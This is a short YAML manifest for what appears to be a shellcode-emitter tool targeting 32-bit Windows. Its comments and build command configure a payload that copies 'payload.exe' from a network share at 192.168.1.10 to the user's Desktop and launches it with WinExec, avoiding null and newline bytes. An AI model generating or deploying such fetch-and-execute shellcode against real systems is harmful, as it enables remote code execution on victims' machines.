# CopyFileA to user directory (runtime path via GetUserNameA)
# IR workflow: GetUserNameA -> build path -> CopyFileA -> WinExec
#
# Build:
#   uv run emitrion emitrion/manifests/win-x86/copy_to_userdir.yaml \
#       --src "\\\\192.168.1.10\\share\\payload.exe" \
#       --path-prefix "C:\Users\\" \
#       --path-suffix "\Desktop\payload.exe" \
#       --no-assemble --out emitter_out/
template: ir_copy_to_userdir
badchars: ["00", "0A", "0D"]
